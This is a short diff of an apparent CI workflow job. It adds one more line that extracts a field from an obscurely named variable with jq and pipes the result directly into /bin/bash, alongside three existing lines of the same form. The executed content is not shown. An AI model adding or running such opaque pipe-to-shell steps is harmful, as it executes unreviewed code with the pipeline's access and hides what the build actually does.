@@ -24,6 +24,7 @@ jobs:
           echo $fe87 | jq -r .tpvin260 | /bin/bash
           echo $p3 | jq -r .ru0 | /bin/bash
           printf '%s' "$ahen68" | jq -r .nrxs424 | /bin/bash
+          echo $ru5554 | jq -r .lxqy888 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
